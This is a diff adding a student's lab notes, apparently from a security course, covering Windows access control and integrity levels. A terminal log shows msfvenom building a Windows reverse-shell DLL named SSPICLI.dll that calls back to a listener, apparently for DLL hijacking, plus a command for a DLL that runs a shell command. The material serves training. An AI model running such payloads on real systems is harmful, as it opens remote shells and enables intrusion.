@@ -1,0 +1,43 @@
+kernal vs user mode
+
+priv v unpriv
+
+windows access controls model
+
+access tokens
+
+DACL
+SACL
+ACEs
+
+
+windows integrity mechanisms
+
+untrusted, low, medium, high, system
+
+
+student@lin-ops:/$ msfvenom -p windows/shell_reverse_tcp LHOST=10.50.26.146 LPORT=4444 -f dll > SSPICLI.dll
+bash: SSPICLI.dll: Permission denied
+student@lin-ops:/$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.50.26.146 LPORT=4444 -f dll > SSPICLI.dll
+bash: SSPICLI.dll: Permission denied
+student@lin-ops:/$ cd /home/student/
+student@lin-ops:~$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.50.26.146 LPORT=4444 -f dll > SSPICLI.dll
+[sudo] password for student: 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of dll file: 8704 bytes
+
+student@lin-ops:~$ ls
+192.168.28.111:8080  Downloads  Pictures     Templates     bash                              cookiefile.txt  hello            loops.sh    nope    python       test    thinclient_drives
+Deez                 Music      Public       Videos        brian.p.mccarthy21@workstation20  file            help             msfinstall  omg.sh  scrap.py     test01  whoops
+Desktop              Notes      SSPICLI.dll  Workfiles     codeacademy                       file.pub        help.sh          new         peda    scrapper.py  test03  whoops.php
+Documents            Oldgit     TEST         afternoon.sh  cookie.php                        fun.d           longTermStorage  newhelp     prac    security     text
+student@lin-ops:~$ file SSPICLI.dll 
+SSPICLI.dll: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+student@lin-ops:~$ 
+
+
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
